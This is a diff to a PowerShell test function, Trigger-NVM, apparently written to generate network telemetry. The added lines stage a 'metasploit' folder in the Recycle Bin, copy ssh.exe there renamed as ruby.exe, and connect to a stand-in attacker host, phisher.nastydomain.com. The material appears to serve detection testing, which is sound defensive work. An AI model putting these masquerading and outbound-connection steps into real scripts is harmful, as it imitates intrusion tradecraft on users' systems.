@@ -92,6 +92,17 @@ function Trigger-NVM {
     Try {
         Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2025/nvidia-cisco-ai-2400x1028.jpg' -OutFile "$env:TEMP\Wallpaper.jpg"
         Remove-Item "$env:TEMP\Wallpaper.jpg"
+        Set-Location -LiteralPath 'C:\`$Recycle.Bin\'
+        if (Test-Path -Path ./metasploit) {
+            Remove-Item -Path ./metasploit -Recurse
+            }
+        mkdir 'metasploit'
+        cd 'metasploit'
+        cp C:\Windows\System32\OpenSSH\ssh.exe .\ruby.exe
+        
+        .\ruby.exe badguy@phisher.nastydomain.com
+      
+   
     } Catch {
         Write-Host "NVM test failed. Continuing..." -ForegroundColor Yellow
     }
